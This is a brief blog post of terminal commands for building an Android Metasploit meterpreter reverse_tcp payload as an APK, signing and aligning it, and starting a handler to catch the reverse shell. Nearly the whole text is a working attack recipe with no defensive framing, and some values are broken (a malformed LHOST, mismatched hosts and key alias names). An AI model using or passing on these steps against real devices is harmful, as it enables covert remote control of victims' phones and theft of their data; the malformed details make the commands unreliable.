---
title: Hacking Android Mobile Through Metasploit
date: 2016-05-17 10:09:44
tags: Metasploit,Android
---


### msfvenom generate payload


```
> msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1128 LPORT=4444 R /root/Desktop/pentest.apk
> keytool -genkey -v -keystore my-release-key.Keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
> jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.Keystore pentest.apk aliasname
> jarsigner -verify -verbose -certs pentest.apk
> zipalign -v 4 pentest.apk newpentest.apk
msf> use exploit/multi/handler
msf> set PAYLOAD android/meterpreter/reverse_tcp
msf> set LHOST 192.168.1.10
msf> set LPORT 4444
msf> exploit
```

